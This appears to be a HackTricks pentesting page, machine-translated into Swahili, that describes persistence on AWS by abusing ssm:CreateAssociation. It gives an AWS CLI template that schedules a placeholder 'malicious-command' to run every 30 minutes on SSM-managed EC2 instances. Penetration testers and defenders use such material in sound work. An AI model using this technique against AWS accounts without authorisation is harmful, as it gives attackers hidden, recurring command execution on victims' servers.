# AWS - SSM Perssitence

{{#include ../../../banners/hacktricks-training.md}}

## SSM

Kwa maelezo zaidi angalia:

{{#ref}}
../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/README.md
{{#endref}}

### Kutumia ssm:CreateAssociation kwa uendelevu

Mshambuliaji mwenye ruhusa ssm:CreateAssociation anaweza kuunda Mshikamano wa Meneja wa Jimbo ili kutekeleza amri kiotomatiki kwenye mifano ya EC2 inayosimamiwa na SSM. Mshikamano haya yanaweza kuwekewa mipangilio ya kukimbia kwa muda maalum, na kuifanya kuwa sahihi kwa uendelevu kama wa nyuma bila vikao vya mwingiliano.
```bash
aws ssm create-association \
--name SSM-Document-Name \
--targets Key=InstanceIds,Values=target-instance-id \
--parameters commands=["malicious-command"] \
--schedule-expression "rate(30 minutes)" \
--association-name association-name
```
> [!NOTE]
> Njia hii ya kudumu inafanya kazi mradi tu EC2 instance inasimamiwa na Systems Manager, SSM agent inafanya kazi, na mshambuliaji ana ruhusa ya kuunda ushirikiano. Haihitaji vikao vya mwingiliano au ruhusa za wazi za ssm:SendCommand. **Muhimu:** Parameta ya `--schedule-expression` (mfano, `rate(30 minutes)`) inapaswa kuheshimu kiwango cha chini cha AWS cha dakika 30. Kwa utekelezaji wa haraka au wa mara moja, acha kabisa `--schedule-expression` â€” ushirikiano utafanyika mara moja baada ya kuundwa.

{{#include ../../../banners/hacktricks-training.md}}
